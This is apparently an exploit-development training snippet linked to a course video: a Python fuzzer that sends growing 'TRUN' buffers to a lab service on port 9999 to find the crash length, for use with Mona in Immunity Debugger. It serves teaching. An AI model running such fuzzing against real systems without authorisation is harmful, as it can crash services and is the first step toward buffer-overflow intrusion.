Here are Python 3 scripts that can be used together with **Mona** in immunity debugger, Make sure to watch [this](https://academy.tcm-sec.com/courses/1152300/lectures/30165111) video to understand more


```python
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.4.104',9999))

		payload = "TRUN /.:/" + buffer

		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
```
